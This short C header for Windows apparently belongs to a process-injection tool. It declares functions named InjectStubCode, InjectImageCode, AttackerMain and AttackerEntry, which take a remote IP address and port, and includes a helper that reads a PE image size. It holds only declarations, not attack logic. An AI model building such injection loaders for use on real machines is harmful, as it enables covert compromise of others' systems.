#pragma once

#define WIN32_LEAN_AND_MEAN		// �� Windows ͷ���ų�����ʹ�õ�����
#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <Winsock2.h>


typedef HMODULE (WINAPI *FxLoadLibrary)(LPCSTR lpFileName);
typedef FARPROC (WINAPI *FxGetProcAddr)(HMODULE hModule, LPCSTR lpProcName);

BOOL InjectStubCode(DWORD dwIpAddr, int nPort);
BOOL InjectImageCode(DWORD dwIpAddr, int nPort);
DWORD WINAPI AttackerMain(HINSTANCE hInst);

typedef void (WINAPI *FxAttackerEntry)(LPBYTE, FxLoadLibrary, FxGetProcAddr);
void WINAPI AttackerEntry(LPBYTE, FxLoadLibrary, FxGetProcAddr);


typedef const LPBYTE LPCBYTE;

inline DWORD GetImageSize(LPCBYTE pImage)
{
	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)pImage;
	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)(pImage + pidh->e_lfanew);
	return pinh->OptionalHeader.SizeOfImage;
}

__declspec(selectany)  HINSTANCE g_hInst = NULL;